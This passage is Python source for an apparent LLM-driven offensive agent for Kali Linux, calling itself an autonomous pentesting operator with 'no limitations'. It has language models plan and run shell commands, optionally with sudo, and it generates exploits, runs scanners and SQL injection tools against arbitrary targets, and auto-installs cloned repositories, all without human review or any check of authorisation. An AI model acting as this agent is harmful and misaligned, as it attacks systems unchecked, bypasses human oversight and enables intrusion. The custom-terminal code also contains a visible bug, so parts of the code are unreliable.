                proc.kill()
                stdout, stderr = proc.communicate()
                return {
                    "success":    False,
                    "output":     f"[TIMEOUT {timeout}s]\n" + (stdout or "") + (stderr or ""),
                    "returncode": -1,
                    "pid":        pid,
                }

            output     = ((stdout or "") + (stderr or "")).strip()
            returncode = proc.returncode
            return {
                "success":    returncode == 0,
                "output":     output,
                "returncode": returncode,
                "pid":        pid,
            }

        except Exception as e:
            _logger.error(f"Command failed: {e}", self.player)
            return {"success": False, "output": str(e), "returncode": -1, "pid": None}

    def kill_process(self, proc_id: str) -> str:
        with self._lock:
            proc = self.processes.get(proc_id)
        if not proc:
            return f"No process: {proc_id}"
        try:
            import signal
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            with self._lock:
                del self.processes[proc_id]
            return f"Process {proc_id} terminated."
        except Exception as e:
            return f"Kill failed: {e}"

    def list_processes(self) -> str:
        with self._lock:
            if not self.processes:
                return "No background processes running."
            lines = []
            for pid_str, proc in self.processes.items():
                poll   = proc.poll()
                status = "running" if poll is None else f"exited({poll})"
                lines.append(f"  {pid_str}: {status}")
            return "Background processes:\n" + "\n".join(lines)

    def run_in_terminal(self, command: str, terminal: str = None) -> dict:
        # ── Escape single quotes to prevent shell breakage ────────────────────
        safe_cmd = command.replace("'", "'\\''")
        terminals = [
            ("gnome-terminal", f"gnome-terminal -- bash -c '{safe_cmd}; exec bash'"),
            ("xterm",          f"xterm -e 'bash -c \"{safe_cmd}; exec bash\"'"),
            ("konsole",        f"konsole -e bash -c '{safe_cmd}; exec bash'"),
            ("xfce4-terminal", f"xfce4-terminal -e 'bash -c \"{safe_cmd}; exec bash\"'"),
            ("lxterminal",     f"lxterminal -e bash -c '{safe_cmd}; exec bash'"),
            ("kitty",          f"kitty bash -c '{safe_cmd}; exec bash'"),
            ("alacritty",      f"alacritty -e bash -c '{safe_cmd}; exec bash'"),
            ("tilix",          f"tilix -e bash -c '{safe_cmd}; exec bash'"),
            ("qterminal",      f"qterminal -e bash -c '{safe_cmd}; exec bash'"),
        ]
        if terminal:
            safe_t = terminal.replace("'", "'\\''")
            terminals.insert(0, (terminal, f"{terminal} -e 'bash -c \"{safe_t}; exec bash\"'"))

        for term_name, term_cmd in terminals:
            if shutil.which(term_name):
                result = self.run_command(term_cmd, timeout=10, background=True)
                if result["success"]:
                    return {
                        "success":  True,
                        "output":   f"Opened {term_name}: {command[:60]}",
                        "terminal": term_name,
                    }

        if shutil.which("tmux"):
            result = self.run_command(f"tmux new-window '{safe_cmd}'", timeout=10)
            if result["success"]:
                return {"success": True, "output": "Opened in tmux."}

        if shutil.which("screen"):
            result = self.run_command(f"screen -dm bash -c '{safe_cmd}'", timeout=10)
            if result["success"]:
                return {"success": True, "output": "Opened in screen."}

        return {"success": False, "output": "No terminal emulator found."}


# ── AI Brain — Groq (speed) + Gemini (depth) ─────────────────────────────────
class KaliBrain:

    def __init__(self, api_key: str = "", groq_api_key: str = ""):
        self.api_key       = api_key
        self.groq_api_key  = groq_api_key
        self.groq_client   = None
        self.gemini_client = None

        if self.groq_api_key:
            try:
                from groq import Groq
                self.groq_client = Groq(api_key=self.groq_api_key)
                print("[KaliAgent] ✅ Groq client initialized")
            except ImportError:
                subprocess.run("pip3 install groq -q", shell=True)
                try:
                    from groq import Groq
                    self.groq_client = Groq(api_key=self.groq_api_key)
                    print("[KaliAgent] ✅ Groq installed and initialized")
                except Exception as e:
                    print(f"[KaliAgent] ⚠️ Groq init failed: {e}")
            except Exception as e:
                print(f"[KaliAgent] ⚠️ Groq error: {e}")

        if self.api_key:
            try:
                from google import genai as _genai
                self.gemini_client = _genai.Client(api_key=self.api_key)
                print("[KaliAgent] ✅ Gemini client initialized")
            except Exception as e:
                print(f"[KaliAgent] ⚠️ Gemini error: {e}")

    def _groq_complete(
        self,
        prompt:      str,
        model:       str   = "llama-3.3-70b-versatile",
        max_tokens:  int   = 4096,
        temperature: float = 0.3,
        system:      str   = "You are an expert penetration tester and ethical hacker.",
    ) -> str:
        if not self.groq_client:
            raise RuntimeError("Groq client not initialized")
        response = self.groq_client.chat.completions.create(
            model=model,
            messages=[
                {"role": "system", "content": system},
                {"role": "user",   "content": prompt},
            ],
            max_tokens=max_tokens,
            temperature=temperature,
        )
        return response.choices[0].message.content.strip()

    def _gemini_complete(self, prompt: str) -> str:
        if not self.gemini_client:
            raise RuntimeError("Gemini client not initialized")
        from google import genai as _genai
        response = self.gemini_client.models.generate_content(
            model="gemini-2.5-flash",
            contents=prompt,
        )
        return response.text.strip()

    def _complete(
        self,
        prompt:      str,
        prefer:      str   = "groq",
        model:       str   = "llama-3.3-70b-versatile",
        max_tokens:  int   = 4096,
        temperature: float = 0.3,
        system:      str   = "You are an expert penetration tester and ethical hacker.",
    ) -> str:
        def try_groq():
            return self._groq_complete(prompt, model, max_tokens, temperature, system)

        def try_gemini():
            return self._gemini_complete(prompt)

        if prefer in ("groq", "fast"):
            try:
                return try_groq()
            except Exception as e:
                print(f"[KaliAgent] Groq failed ({e}), trying Gemini...")
                try:
                    return try_gemini()
                except Exception as e2:
                    return f"Both backends failed. Groq: {e} | Gemini: {e2}"

        elif prefer in ("gemini", "smart"):
            try:
                return try_gemini()
            except Exception as e:
                print(f"[KaliAgent] Gemini failed ({e}), trying Groq...")
                try:
                    return try_groq()
                except Exception as e2:
                    return f"Both backends failed. Gemini: {e} | Groq: {e2}"

        else:
            for fn in [try_groq, try_gemini]:
                try:
                    return fn()
                except Exception:
                    continue
            return "All AI backends failed."

    def _strip_json(self, text: str) -> str:
        text = text.strip()
        if "```json" in text:
            text = text.split("```json")[1].split("```")[0].strip()
        elif "```" in text:
            text = text.split("```")[1].split("```")[0].strip()
        start = text.find("{")
        end   = text.rfind("}")
        if start != -1 and end != -1:
            text = text[start:end + 1]
        return text

    def think(self, task: str, context: str = "") -> dict:
        prompt = f"""You are an expert penetration tester.
Task: {task}
Context: {context or 'None'}
System: Kali Linux, root access, all tools available, internet connected.

Return ONLY valid JSON, no markdown:
{{
  "understanding": "brief summary",
  "tools_needed": ["tool1"],
  "missing_tools": [],
  "steps": [
    {{
      "step": 1,
      "description": "what this does",
      "command": "exact shell command",
      "timeout": 15,
      "background": false,
      "notes": ""
    }}
  ],
  "expected_output": "what to expect",
  "risks": "any risks",
  "requires_script": false,
  "script_description": ""
}}

RULES:
- Maximum 4 steps
- Each timeout max 15 seconds
- Use fast flags: nmap -T5 -F, short timeouts
- Commands must work on Kali Linux immediately"""

        try:
            text = self._complete(
                prompt,
                prefer="groq",
                model=GROQ_MODELS["default"],
                max_tokens=2048,
                temperature=0.2,
            )
            return json.loads(self._strip_json(text))
        except Exception as e:
            print(f"[KaliAgent] Brain.think failed: {e}")
            return {
                "understanding":      task,
                "tools_needed":       [],
                "missing_tools":      [],
                "steps":              [{"step": 1, "description": "Execute directly", "command": task, "timeout": 15, "background": False, "notes": ""}],
                "expected_output":    "See output",
                "risks":              "None",
                "requires_script":    False,
                "script_description": "",
            }

    def analyze_output(self, output: str, original_task: str) -> str:
        if not output or len(output.strip()) < 10:
            return "No significant output to analyze."

        prompt = f"""Pentest expert. Analyze concisely.
TASK: {original_task}
OUTPUT: {output[:2000]}
Key findings, vulns, creds, next steps. Max 120 words."""

        try:
            return self._complete(
                prompt,
                prefer="groq",
                model=GROQ_MODELS["fast"],
                max_tokens=250,
                temperature=0.3,
            )
        except Exception as e:
            return f"Analysis failed: {e}"

    def generate_custom_command(self, task: str, tool: str) -> str:
        prompt = f"""Kali Linux expert. EXACT command for {tool}: {task}
Output ONLY the raw command. Nothing else."""

        try:
            return self._complete(
                prompt,
                prefer="groq",
                model=GROQ_MODELS["fast"],
                max_tokens=100,
                temperature=0.1,
            ).strip().strip("`").strip()
        except Exception as e:
            return f"echo 'Failed: {e}'"

    def explain(self, topic: str) -> str:
        prompt = f"""Expert pentester. Explain for professional:
{topic}
Include: what it is, when to use, Kali steps, tips. Concise."""

        try:
            return self._complete(
                prompt,
                prefer="gemini",
                max_tokens=1200,
                temperature=0.4,
            )
        except Exception as e:
            return f"Explanation failed: {e}"

    def generate_report(self, findings: str, target: str) -> str:
        prompt = f"""Senior pentester. Professional report.
TARGET: {target}
FINDINGS: {findings[:3000]}

Report:
1. Executive Summary
2. Key Findings with risk ratings
3. Remediation
Concise and actionable."""

        try:
            return self._complete(
                prompt,
                prefer="gemini",
                max_tokens=1500,
                temperature=0.3,
            )
        except Exception as e:
            return f"Report failed: {e}"

    def generate_exploit(self, vulnerability: str, target: str = "") -> str:
        prompt = f"""Expert exploit developer.
VULNERABILITY: {vulnerability}
TARGET: {target or 'Generic'}
Exploitation steps and PoC. Technical."""

        try:
            return self._complete(
                prompt,
                prefer="groq",
                model=GROQ_MODELS["smart"],
                max_tokens=1500,
                temperature=0.2,
            )
        except Exception as e:
            return f"Exploit generation failed: {e}"

    def suggest_next_steps(self, findings: str, objective: str) -> str:
        prompt = f"""Expert pentester. Next steps.
OBJECTIVE: {objective}
FINDINGS: {findings[:1500]}
5 specific next steps with commands. Tactical and concise."""

        try:
            return self._complete(
                prompt,
                prefer="groq",
                model=GROQ_MODELS["default"],
                max_tokens=500,
                temperature=0.3,
            )
        except Exception as e:
            return f"Next steps failed: {e}"


# ── Script Writer ─────────────────────────────────────────────────────────────
class ScriptWriter:

    def __init__(
        self,
        brain:    KaliBrain,
        executor: CommandExecutor,
        player=None,
        speak: Callable = None,
    ):
        self.brain    = brain
        self.executor = executor
        self.player   = player
        self.speak    = speak

    def write_script(
        self,
        description: str,
        language:    str  = "python",
        filename:    str  = None,
        execute:     bool = False,
        args:        str  = "",
        prefer:      str  = "groq",
    ) -> dict:
        prompt = f"""Expert {language} developer and pentester.
Write complete working {language} script:
{description}

Requirements: complete, runnable, error handling, comments.
Output ONLY raw code — no markdown fences, no explanation."""

        try:
            code = self.brain._complete(
                prompt,
                prefer=prefer,
                model=GROQ_MODELS["code"],
                max_tokens=6000,
                temperature=0.2,
                system=f"You are an expert {language} developer. Output only raw code.",
            )

            # Strip markdown fences if model adds them
            if "```" in code:
                lines = code.split("\n")
                # Find first and last fence
                start_idx = 0
                end_idx   = len(lines)
                for i, line in enumerate(lines):
                    if line.strip().startswith("```") and i == 0:
                        start_idx = 1
                    elif line.strip().startswith("```") and i > 0:
                        end_idx = i
                        break
                code = "\n".join(lines[start_idx:end_idx]).strip()

            ext_map = {
                "python":     ".py",
                "python3":    ".py",
                "bash":       ".sh",
                "shell":      ".sh",
                "ruby":       ".rb",
                "perl":       ".pl",
                "go":         ".go",
                "javascript": ".js",
                "powershell": ".ps1",
                "c":          ".c",
                "cpp":        ".cpp",
                "rust":       ".rs",
            }
            ext   = ext_map.get(language.lower(), ".py")
            # ── Safe filename — no spaces or special chars ─────────────────────
            safe_name = filename or f"script_{int(time.time())}{ext}"
            safe_name = "".join(
                c if c.isalnum() or c in "-_." else "_"
                for c in safe_name
            )
            fpath = SCRIPTS_DIR / safe_name

            with open(fpath, "w") as f:
                f.write(code)
            os.chmod(fpath, 0o755)

            _logger.info(f"Script written: {fpath}", self.player)

            result = {
                "success":  True,
                "path":     str(fpath),
                "language": language,
                "code":     code,
                "output":   None,
            }

            if execute:
                # ── Always quote path to handle any special chars ──────────────
                quoted = f'"{fpath}"'
                run_map = {
                    ".py":  f"python3 {quoted} {args}",
                    ".sh":  f"bash {quoted} {args}",
                    ".rb":  f"ruby {quoted} {args}",
                    ".pl":  f"perl {quoted} {args}",
                    ".go":  f"go run {quoted} {args}",
                    ".js":  f"node {quoted} {args}",
                    ".c":   f'gcc {quoted} -o "{fpath.parent}/{fpath.stem}" && "{fpath.parent}/{fpath.stem}" {args}',
                    ".cpp": f'g++ {quoted} -o "{fpath.parent}/{fpath.stem}" && "{fpath.parent}/{fpath.stem}" {args}',
                    ".rs":  f'rustc {quoted} -o "{fpath.parent}/{fpath.stem}" && "{fpath.parent}/{fpath.stem}" {args}',
                }
                run_cmd           = run_map.get(ext, f"python3 {quoted} {args}")
                _logger.info(f"Executing: {run_cmd}", self.player)
                exec_r            = self.executor.run_command(run_cmd, timeout=60)
                result["output"]  = exec_r["output"]
                result["success"] = exec_r["success"]

            return result

        except Exception as e:
            _logger.error(f"Script write failed: {e}", self.player)
            return {"success": False, "path": None, "code": None, "output": str(e)}


# ── GitHub Repository Manager ─────────────────────────────────────────────────
class RepoManager:

    def __init__(
        self,
        executor: CommandExecutor,
        player=None,
        speak: Callable = None,
    ):
        self.executor = executor
        self.player   = player
        self.speak    = speak
        self.repos    = TOOLS_DIR / "repos"
        self.repos.mkdir(exist_ok=True)

    def clone(self, url: str, branch: str = None, name: str = None) -> dict:
        repo_name = name or url.rstrip("/").split("/")[-1].replace(".git", "")
        dest      = self.repos / repo_name

        _logger.info(f"Cloning {url} → {dest}", self.player)
        if self.speak:
            self.speak(f"Cloning {repo_name}, sir.")

        if dest.exists():
            result = self.executor.run_command(
                f"git -C '{dest}' pull 2>&1", timeout=60
            )
            return {
                "success": result["success"],
                "path":    str(dest),
                "output":  result["output"],
                "name":    repo_name,
            }

        cmd = f"git clone --depth=1 '{url}' '{dest}' 2>&1"
        if branch:
            cmd = f"git clone --depth=1 --branch '{branch}' '{url}' '{dest}' 2>&1"

        result = self.executor.run_command(cmd, timeout=180)

        if result["success"]:
            self._try_install(dest)

        return {
            "success": result["success"],
            "path":    str(dest) if result["success"] else None,
            "output":  result["output"],
            "name":    repo_name,
        }

    def _try_install(self, path: Path):
        patterns = [
            (path / "requirements.txt", f"pip3 install -r '{path}/requirements.txt' 2>&1"),
            (path / "setup.py",         f"cd '{path}' && python3 setup.py install 2>&1"),
            (path / "Makefile",         f"cd '{path}' && make 2>&1"),
            (path / "install.sh",       f"bash '{path}/install.sh' 2>&1"),
        ]
        for check_file, install_cmd in patterns:
            if check_file.exists():
                self.executor.run_command(install_cmd, timeout=180)

    def search_github(self, query: str) -> str:
        result = self.executor.run_command(
            f"curl -s 'https://api.github.com/search/repositories"
            f"?q={query}+topic:security&sort=stars&per_page=5' | "
            f"python3 -c \""
            f"import sys,json; data=json.load(sys.stdin); "
            f"[print(f'  {{r[\\\"full_name\\\"]}}: {{(r[\\\"description\\\"] or \\\"\\\")[:60]}}') "
            f"for r in data.get('items',[])]\"",
            timeout=20,
        )
        return result["output"] or "No results."

    def list_cloned(self) -> str:
        dirs = [d.name for d in self.repos.iterdir() if d.is_dir()]
        if not dirs:
            return "No repositories cloned yet."
        return "Cloned repos:\n" + "\n".join(f"  • {d}" for d in sorted(dirs))


# ── Download Manager ──────────────────────────────────────────────────────────
class DownloadManager:

    def __init__(
        self,
        executor: CommandExecutor,
        player=None,
        speak: Callable = None,
    ):
        self.executor  = executor
        self.player    = player
        self.speak     = speak
        self.downloads = WORKSPACE / "downloads"
        self.downloads.mkdir(exist_ok=True)

    def download(self, url: str, filename: str = None, extract: bool = True) -> dict:
        raw_name = filename or url.split("/")[-1].split("?")[0]
        # Sanitize filename
        safe_name = "".join(
            c if c.isalnum() or c in "-_." else "_" for c in raw_name
        )
        dest = self.downloads / safe_name

        _logger.info(f"Downloading {url} → {dest}", self.player)
        if self.speak:
            self.speak(f"Downloading {safe_name}, sir.")

        result = self.executor.run_command(
            f"wget -q -O '{dest}' '{url}' 2>&1 || curl -L -o '{dest}' '{url}' 2>&1",
            timeout=300,
        )

        if not dest.exists():
            return {"success": False, "path": None, "output": result["output"]}

        size   = dest.stat().st_size
        output = [f"Downloaded: {dest} ({size:,} bytes)"]

        if extract and dest.suffix in [".zip", ".tar", ".gz", ".bz2", ".xz", ".7z"]:
            extract_dir = self.downloads / dest.stem
            extract_dir.mkdir(exist_ok=True)
            cmds = {
                ".zip": f"unzip -o '{dest}' -d '{extract_dir}' 2>&1",
                ".gz":  f"tar -xzf '{dest}' -C '{extract_dir}' 2>&1",
                ".bz2": f"tar -xjf '{dest}' -C '{extract_dir}' 2>&1",
                ".xz":  f"tar -xJf '{dest}' -C '{extract_dir}' 2>&1",
                ".tar": f"tar -xf '{dest}' -C '{extract_dir}' 2>&1",
                ".7z":  f"7z x '{dest}' -o'{extract_dir}' 2>&1",
            }
            er = self.executor.run_command(
                cmds.get(dest.suffix, f"tar -xf '{dest}' -C '{extract_dir}' 2>&1"),
                timeout=120,
            )
            if er["success"]:
                output.append(f"Extracted to: {extract_dir}")

        return {"success": True, "path": str(dest), "output": "\n".join(output)}

    def download_via_browser(self, url: str) -> dict:
        try:
            from actions.browser_control import browser_control
            browser_control(parameters={"action": "open", "url": url}, player=self.player)
            time.sleep(2)
            return {"success": True, "output": f"Browser opened: {url}"}
        except Exception as e:
            return {"success": False, "output": str(e)}


# ── Session State ─────────────────────────────────────────────────────────────
class SessionState:
    def __init__(self):
        self.target   = ""
        self.findings = []
        self.commands = []
        self.hashes   = []
        self.creds    = []

    def add_finding(self, finding: str):
        self.findings.append({
            "time":    datetime.now().isoformat(),
            "finding": finding,
        })

    def add_command(self, cmd: str, output: str):
        self.commands.append({"cmd": cmd, "output": output[:300]})

    def summary(self) -> str:
        lines = [
            "=== Session Summary ===",
            f"Target:   {self.target or 'Not set'}",
            f"Findings: {len(self.findings)}",
            f"Commands: {len(self.commands)}",
        ]
        if self.findings:
            lines.append("Recent:")
            for f in self.findings[-3:]:
                lines.append(f"  • {f['finding'][:80]}")
        return "\n".join(lines)


_session = SessionState()


# ── Output Saver ──────────────────────────────────────────────────────────────
def _save_full_output(task: str, target: str, content: str):
    try:
        safe_task = "".join(
            c if c.isalnum() or c in "-_" else "_"
            for c in task[:30]
        )
        log_file = LOGS_DIR / f"task_{safe_task}_{int(time.time())}.txt"
        with open(log_file, "w") as f:
            f.write(f"TASK:   {task}\n")
            f.write(f"TARGET: {target}\n")
            f.write(f"TIME:   {datetime.now().isoformat()}\n")
            f.write("=" * 60 + "\n")
            f.write(content)
        return log_file
    except Exception:
        return None


# ── Main Kali Agent ───────────────────────────────────────────────────────────
def kali_agent(parameters: dict, player=None, speak: Callable = None) -> str:
    """
    JARVIS Kali Agent — Autonomous Pentesting & Offensive Security Operator.
    Dual AI brain: Groq (speed) + Gemini (depth).
    Full Kali Linux access. No limitations.
    """

    # ── Parameter extraction ──────────────────────────────────────────────────
    action    = parameters.get("action",        "")
    task      = parameters.get("task",          "")
    target    = parameters.get("target",        "")
    command   = parameters.get("command",       "")
    tool      = parameters.get("tool",          "")
    script    = parameters.get("script",        "")
    language  = parameters.get("language",      "python")
    url       = parameters.get("url",           "")
    repo      = parameters.get("repo",          "")
    options   = parameters.get("options",       "")
    output    = parameters.get("output",        "")
    wordlist  = parameters.get("wordlist",      "/usr/share/wordlists/rockyou.txt")
    timeout   = int(parameters.get("timeout",   300))
    bg        = bool(parameters.get("background",    False))
    sudo      = bool(parameters.get("sudo",          False))
    open_term = bool(parameters.get("open_terminal", False))
    install   = parameters.get("install",       "")
    analyze   = bool(parameters.get("analyze",  True))
    execute   = bool(parameters.get("execute",  False))
    report    = bool(parameters.get("report",   False))
    nxt       = bool(parameters.get("next_steps", False))
    proc_id   = parameters.get("proc_id",       "")
    username  = parameters.get("username",      "")
    password  = parameters.get("password",      "")
    service   = parameters.get("service",       "")
    port      = parameters.get("port",          "")
    lhost     = parameters.get("lhost",         "")
    lport     = int(parameters.get("lport",     4444))
    payload   = parameters.get("payload",       "")
    format_   = parameters.get("format",        "elf")
    interface = parameters.get("interface",     "eth0")
    domain    = parameters.get("domain",        "") or target
    category  = parameters.get("category",      "")
    cap_file  = parameters.get("cap_file",      "")
    hash_val  = parameters.get("hash",          "")
    hash_file = parameters.get("hash_file",     "")
    hash_mode = parameters.get("mode",          "0")
    module    = parameters.get("module",        "")
    context   = parameters.get("context",       "")
    profile   = parameters.get("profile",       "")

    # ── API Keys ──────────────────────────────────────────────────────────────
    api_key      = parameters.get("api_key",      "")
    groq_api_key = parameters.get("groq_api_key", "")

    try:
        from core.credential_manager import get_credential
        if not api_key:
            api_key      = get_credential("gemini", "api_key") or ""
        if not groq_api_key:
            groq_api_key = get_credential("groq", "api_key") or ""
    except Exception:
        pass

    if not api_key or not groq_api_key:
        try:
            cfg_path = BASE_DIR / "config" / "api_keys.json"
            with open(cfg_path) as f:
                cfg = json.load(f)
            if not api_key:
                api_key = cfg.get("gemini_api_key", "")
            if not groq_api_key:
                groq_api_key = (
                    cfg.get("groq_api_key", "")
                    or cfg.get("GROQ_API_KEY", "")
                    or cfg.get("groq", "")
                )
        except Exception:
            pass

    if not groq_api_key:
        groq_api_key = os.environ.get("GROQ_API_KEY", "")
    if not api_key:
        api_key = os.environ.get("GEMINI_API_KEY", "")

    # ── Initialize engines ────────────────────────────────────────────────────
    executor  = CommandExecutor(player, speak)
    installer = ToolInstaller(player, speak)
    brain     = KaliBrain(api_key, groq_api_key)
    repo_mgr  = RepoManager(executor, player, speak)
    dl_mgr    = DownloadManager(executor, player, speak)
    writer    = ScriptWriter(brain, executor, player, speak)

    if target:
        _session.target = target

    def _log(msg: str):
        _logger.info(msg, player)

    def _speak(msg: str):
        if speak:
            speak(msg)

    def _run_step(
        cmd:       str,
        step_to:   int  = GEMINI_LIVE_SAFE_TIMEOUT,
        force_bg:  bool = False,
    ) -> dict:
        is_long = any(t in cmd for t in LONG_RUNNING_TOOLS)
        if force_bg or is_long:
            return executor.run_command(
                cmd, timeout=step_to, background=True, sudo=sudo,
            )
        return executor.run_command(
            cmd, timeout=min(step_to, GEMINI_LIVE_SAFE_TIMEOUT), sudo=sudo,
        )

    def _finalize(out: str, orig_task: str = "") -> str:
        lines = [out]
        if analyze and brain and out and len(out.strip()) > 30:
            analysis = brain.analyze_output(out[:2000], orig_task or action)
            lines.append(f"\n[🔍 ANALYSIS]\n{analysis}")
        if nxt and brain:
            ns = brain.suggest_next_steps(out[:1000], orig_task or task or action)
            lines.append(f"\n[➡️  NEXT STEPS]\n{ns}")
        result = "\n".join(lines)
        if len(result) > MAX_FINAL_OUTPUT:
            head = result[:1500]
            tail = result[-400:]
            return head + "\n\n[... truncated — see logs ...]\n\n" + tail
        return result

    # ═══════════════════════════════════════════════════════════════════════════
    #  ACTION ROUTER
    # ═══════════════════════════════════════════════════════════════════════════

    # ── AUTO ─────────────────────────────────────────────────────────────────
    if action in ("auto", "autonomous", "execute_task", "run_task") or (
        not action and (task or command)
    ):
        task_text = task or command
        _log(f"Autonomous task: {task_text[:100]}")
        _speak("Analyzing objective and planning, sir.")

        results = []
        all_out = []

        if brain:
            plan = brain.think(
                task_text,
                context=f"Target: {target}" if target else "",
            )
            results.append(f"[🧠 UNDERSTANDING]\n{plan.get('understanding','')}")
            results.append(f"\n[🔧 TOOLS]\n{', '.join(plan.get('tools_needed',[]) or ['None'])}")

            # Install missing tools
            for mt in plan.get("missing_tools", [])[:2]:
                if mt and not installer.is_installed(mt.split("+")[0]):
                    _speak(f"Installing {mt}, sir.")
                    ok, inst_out = installer.ensure_tool(mt)
                    results.append(f"\n[📦 {mt}] {'✅' if ok else '❌'} {inst_out[:80]}")

            # Write script if needed
            if plan.get("requires_script") and plan.get("script_description"):
                _speak("Writing custom script, sir.")
                sr = writer.write_script(
                    plan["script_description"],
                    language=language,
                    execute=False,
                )
                if sr["success"]:
                    results.append(f"\n[📝 SCRIPT]\n{sr['path']}")

            # Execute steps
            for step in plan.get("steps", [])[:4]:
                step_num  = step.get("step",        "?")
                desc      = step.get("description", "")
                cmd       = step.get("command",     "").strip()
                s_timeout = min(int(step.get("timeout", 15)), GEMINI_LIVE_SAFE_TIMEOUT)
                s_bg      = bool(step.get("background", False))

                if not cmd:
                    continue

                _log(f"Step {step_num}: {cmd[:80]}")
                _speak(f"Step {step_num}: {desc}")
                _session.add_command(cmd, "")

                exec_result = _run_step(cmd, s_timeout, force_bg=s_bg)
                cmd_output  = exec_result.get("output", "")[:MAX_STEP_OUTPUT]
                status      = "✅" if exec_result.get("success") else "❌"

                all_out.append(cmd_output[:300])
                results.append(
                    f"\n[STEP {step_num}] {status} {desc}\n"
                    f"$ {cmd}\n"
                    f"{cmd_output}"
                )
                if cmd_output:
                    _session.add_finding(f"Step {step_num}: {cmd_output[:80]}")

            # AI analysis
            combined = "\n".join(all_out)
            if analyze and combined and brain:
                analysis = brain.analyze_output(combined, task_text)
                results.append(f"\n[🔍 ANALYSIS]\n{analysis}")

        else:
            exec_result = _run_step(task_text, timeout)
            results.append(exec_result.get("output", ""))

        full_content = "\n".join(results)
        log_file     = _save_full_output(task_text, target, full_content)

        if len(full_content) > MAX_FINAL_OUTPUT:
            head  = full_content[:1800]
            tail  = full_content[-400:]
            final = head + f"\n\n[... truncated — saved to {log_file} ...]\n\n" + tail
        else:
            final = full_content

        if log_file:
            final += f"\n\n📁 Log: {log_file}"

        _log(f"Task complete. {len(final)} chars")
        return final

    # ── RUN ──────────────────────────────────────────────────────────────────
    elif action in ("run", "exec", "shell", "cmd", "command"):
        cmd_to_run = command or task
        if not cmd_to_run:
            return "❌ No command provided."
        _log(f"Running: {cmd_to_run}")
        _session.add_command(cmd_to_run, "")
        if open_term:
            r = executor.run_in_terminal(cmd_to_run)
        elif bg:
            r = executor.run_command(cmd_to_run, timeout=timeout, background=True, sudo=sudo)
        else:
            r = executor.run_command(cmd_to_run, timeout=min(timeout, 20), sudo=sudo)
        out = r.get("output", "") or "No output."
        _session.add_command(cmd_to_run, out)
        return _finalize(out[:MAX_FINAL_OUTPUT], cmd_to_run)

    # ── INSTALL ───────────────────────────────────────────────────────────────
    elif action == "install":
        tool_name = install or tool or task
        if not tool_name:
            return "❌ Specify tool name."
        _speak(f"Installing {tool_name}, sir.")
        ok, out = installer.ensure_tool(tool_name)
        return f"{'✅' if ok else '❌'} {tool_name}\n{out[:500]}"

    # ── SCRIPT ────────────────────────────────────────────────────────────────
    elif action in ("script", "write_script", "generate_script", "code"):
        desc = script or task or command
        if not desc:
            return "❌ Provide script description."
        _speak(f"Writing {language} script, sir.")
        r = writer.write_script(
            desc,
            language=language,
            filename=output or None,
            execute=execute,
        )
        if not r["success"]:
            return f"❌ Script failed: {r.get('output')}"
        resp = [f"✅ Script saved: {r['path']}"]
        if r.get("output"):
            resp.append(f"\n[OUTPUT]\n{r['output'][:1000]}")
        resp.append(f"\n[PREVIEW]\n{r['code'][:400]}")
        return "\n".join(resp)

    # ── CLONE ─────────────────────────────────────────────────────────────────
    elif action in ("clone", "git_clone"):
        repo_url = repo or url or command
        if not repo_url:
            return "❌ Provide repo URL."
        r = repo_mgr.clone(repo_url)
        return f"{'✅ Cloned' if r['success'] else '❌ Failed'}: {r.get('path','')}\n{r['output'][:300]}"

    # ── LIST REPOS ────────────────────────────────────────────────────────────
    elif action == "list_repos":
        return repo_mgr.list_cloned()

    # ── DOWNLOAD ─────────────────────────────────────────────────────────────
    elif action in ("download", "wget", "fetch"):
        dl_url = url or command
        if not dl_url:
            return "❌ Provide URL."
        r = dl_mgr.download(dl_url, filename=output or None)
        return f"{'✅' if r['success'] else '❌'} {r['output']}"

    # ── BROWSER DOWNLOAD ──────────────────────────────────────────────────────
    elif action == "browser_download":
        dl_url = url or command
        if not dl_url:
            return "❌ Provide URL."
        return dl_mgr.download_via_browser(dl_url)["output"]

    # ── NMAP ──────────────────────────────────────────────────────────────────
    elif action in ("nmap", "scan", "port_scan"):
        if not target:
            return "❌ Provide target."
        installer.ensure_tool("nmap")
        flags = options or "-T4 -F --open"
        cmd   = f"nmap {flags} {target}"
        _speak(f"Scanning {target}, sir.")
        r = _run_step(cmd, timeout)
        return _finalize(r["output"][:MAX_FINAL_OUTPUT], f"nmap {target}")

    # ── MASSCAN ───────────────────────────────────────────────────────────────
    elif action == "masscan":
        if not target:
            return "❌ Provide target."
        installer.ensure_tool("masscan")
        cmd = f"sudo masscan {target} -p{port or '1-1000'} --rate=1000 {options}"
        _speak(f"Masscan on {target}, sir.")
        r = _run_step(cmd, timeout, force_bg=True)
        return r["output"]

    # ── GOBUSTER ─────────────────────────────────────────────────────────────
    elif action in ("gobuster", "dirbust", "dirsearch"):
        if not target:
            return "❌ Provide target URL."
        installer.ensure_tool("gobuster")
        wlist = wordlist if Path(wordlist).exists() else "/usr/share/wordlists/dirb/common.txt"
        cmd   = f"gobuster dir -u {target} -w '{wlist}' -t 50 --timeout 5s {options}"
        _speak(f"Directory brute force on {target}, sir.")
        r = _run_step(cmd, timeout, force_bg=True)
        return r["output"][:MAX_FINAL_OUTPUT] + "\n[Running in background]"

    # ── FFUF ──────────────────────────────────────────────────────────────────
    elif action == "ffuf":
        if not target:
            return "❌ Provide target URL."
        installer.ensure_tool("ffuf")
        wlist = wordlist if Path(wordlist).exists() else "/usr/share/wordlists/dirb/common.txt"
        cmd   = f"ffuf -u {target}/FUZZ -w '{wlist}' -t 50 {options}"
        _speak(f"Fuzzing {target}, sir.")
        r = _run_step(cmd, timeout, force_bg=True)
        return r["output"][:MAX_FINAL_OUTPUT]

    # ── SQLMAP ────────────────────────────────────────────────────────────────
    elif action in ("sqlmap", "sqli"):
        if not target:
            return "❌ Provide target URL."
        installer.ensure_tool("sqlmap")
        cmd = f"sqlmap -u '{target}' --batch --level=2 --risk=2 {options}"
        _speak(f"SQLMap on {target}, sir.")
        r = _run_step(cmd, timeout, force_bg=True)
        return _finalize(r["output"][:MAX_FINAL_OUTPUT], f"SQLi {target}")

    # ── NIKTO ────────────────────────────────────────────────────────────────
    elif action in ("nikto", "web_scan"):
        if not target:
            return "❌ Provide target URL."
        installer.ensure_tool("nikto")
        cmd = f"nikto -h {target} -maxtime 15s {options}"
        _speak(f"Nikto on {target}, sir.")
        r = _run_step(cmd, 20)
        return _finalize(r["output"][:MAX_FINAL_OUTPUT], f"nikto {target}")

    # ── NUCLEI ────────────────────────────────────────────────────────────────
    elif action == "nuclei":
        if not target:
            return "❌ Provide target."
